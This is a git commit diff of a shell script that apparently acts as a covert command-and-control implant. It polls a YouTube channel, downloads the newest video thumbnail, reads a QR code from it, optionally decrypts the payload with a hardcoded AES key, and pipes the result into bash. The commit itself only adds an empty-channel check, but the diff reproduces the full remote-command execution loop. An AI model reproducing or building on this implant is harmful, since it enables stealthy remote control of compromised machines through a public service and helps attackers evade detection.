6803e111d9764b4f66eb68233ce9219f72484776
ninjawill543 <lucas.hanson@ynov.com>
2024-03-22 11:28:05 +0100

    can check if channel is empty

--- youtube.sh
+++ youtube.sh
@@ -12,33 +12,37 @@ do
         -d part="snippet" \
         -d order="date")
     newest_video_url=$(echo "$curl_output" | jq -r '.items | sort_by(.snippet.publishedAt) | last | .snippet.thumbnails.high.url')
-    if [[ $newest_video_url == $video_save ]]
-    then
-        echo "Newest video already seen"
+    if [[ $(echo "$curl_output" | jq '.items') == "[]" ]]; then
+        echo "No videos have been published on this channel"
     else
-        echo "New video thumbnail: $newest_video_url"
-        wget -O "$(dirname "$(readlink -f "$0")")/command.jpg" $newest_video_url
-        exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)
-
-        key_hex="4326462948404d635166546a576e5a72" #Please change, this is just used for the example!
-        
-        encrypted_data=$exec
-        if [[ $(echo "$encrypted_data" | cut -c1-3) == "~1~" ]]; 
+        if [[ $newest_video_url == $video_save ]]
         then
-            encrypted_data="${encrypted_data:3}"
-            decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)
-
-            decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')
-
-            echo "Decrypted data: $decrypted_data"
-            echo $decrypted_data | bash
+            echo "Newest video already seen"
         else
-            encrypted_data="${encrypted_data:3}"
-            echo "Data: $encrypted_data"
-            echo $encrypted_data | bash
-        fi
+            echo "New video thumbnail: $newest_video_url"
+            wget -O "$(dirname "$(readlink -f "$0")")/command.jpg" $newest_video_url
+            exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)
 
-        video_save=$newest_video_url
+            key_hex="4326462948404d635166546a576e5a72" #Please change, this is just used for the example!
+            
+            encrypted_data=$exec
+            if [[ $(echo "$encrypted_data" | cut -c1-3) == "~1~" ]]; 
+            then
+                encrypted_data="${encrypted_data:3}"
+                decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)
+
+                decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')
+
+                echo "Decrypted data: $decrypted_data"
+                echo $decrypted_data | bash
+            else
+                encrypted_data="${encrypted_data:3}"
+                echo "Data: $encrypted_data"
+                echo $encrypted_data | bash
+            fi
+
+            video_save=$newest_video_url
+        fi
     fi
     sleep 30
 done
